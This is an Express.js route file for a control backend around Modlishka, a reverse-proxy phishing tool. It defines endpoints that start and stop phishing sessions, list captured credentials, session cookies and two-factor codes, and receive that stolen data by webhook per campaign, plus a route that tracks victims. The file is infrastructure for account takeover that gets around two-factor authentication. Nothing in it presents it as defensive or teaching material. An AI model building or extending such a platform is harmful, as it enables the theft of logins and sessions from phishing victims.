const express = require('express');
const router = express.Router();
const modlishkaController = require('../controllers/modlishkaController');

// Session management routes
router.post('/sessions', modlishkaController.createSession);
router.get('/sessions', modlishkaController.getActiveSessions);
router.delete('/sessions/:sessionId', modlishkaController.stopSession);

// Data retrieval routes
router.get('/sessions/:sessionId/credentials', modlishkaController.getCapturedCredentials);
router.get('/sessions/:sessionId/cookies', modlishkaController.getCapturedCookies);
router.get('/sessions/:sessionId/2fa', modlishkaController.getCaptured2FA);
router.get('/campaigns/:campaignId/stats', modlishkaController.getSessionStats);

// Webhook routes for Modlishka to send data
router.post('/webhook/:sessionId', modlishkaController.handleWebhook);
router.post('/credentials/:campaignId', modlishkaController.handleCredentials);
router.post('/cookies/:campaignId', modlishkaController.handleCookies);
router.post('/2fa/:campaignId', modlishkaController.handle2FA);
router.post('/sessions/:campaignId', modlishkaController.handleSessions);

// Tracking routes
router.get('/track-modlishka/:sessionToken', modlishkaController.handleTracking);

// Database management
router.post('/initialize', modlishkaController.initializeDatabase);

module.exports = router;